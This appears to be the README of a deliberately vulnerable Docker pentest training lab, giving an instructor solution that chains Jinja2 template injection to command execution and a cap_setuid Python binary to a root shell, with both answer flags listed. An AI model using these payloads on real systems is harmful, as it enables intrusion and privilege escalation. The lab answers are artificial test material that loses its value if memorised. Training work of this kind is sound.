# EXAM Lab — single-container pentest exercise

> **Authorized training use only.** Vulnerable by design. Binds to `127.0.0.1`
> only. Do not expose to any untrusted network.

One Docker container running a small Flask status dashboard. The student chains:
HTTP recon → Jinja2 **SSTI** (RCE as `app`) → **cap_setuid** privilege escalation
→ `root` → flag in `/root/flag.txt`.

## Service
| Port | Service | Role |
|------|---------|------|
| 5000 | Flask (Python) | SSTI → RCE; privesc via a capability-bearing python copy |

## Run
Prefer the top-level launcher (`../lab.sh` / `../lab.ps1`) which starts this lab
together with the demo. Standalone:
```bash
docker compose up -d --build
docker compose port lab 5000     # -> 127.0.0.1:<random port>
```
Reset between students:
```bash
docker compose down && docker compose up -d --build
```

## Intended solution (instructor only)
1. **Recon** — open the site, read the HTML source. A `TODO` comment reveals the
   `/greet?name=` endpoint renders the name through the template engine.
2. **SSTI → RCE** — confirm with `?name={{7*7}}` (renders `Hello, 49!`). Then
   execute commands as the `app` user:
   ```
   /greet?name={{cycler.__init__.__globals__.os.popen('id').read()}}
   ```
   User flag: `/home/app/user.txt`. The handover note `/home/app/notes.txt`
   points at the privesc.
3. **Privesc** — `getcap -r / 2>/dev/null` shows `/usr/local/bin/pythonpriv`
   has `cap_setuid+ep`. Any user can then set UID 0:
   ```bash
   /usr/local/bin/pythonpriv -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
   cat /root/flag.txt
   ```

## Flags
- user: `FLAG{ssti_rce_as_app_via_jinja2}`
- root: `FLAG{root_via_cap_setuid_python_gg}`
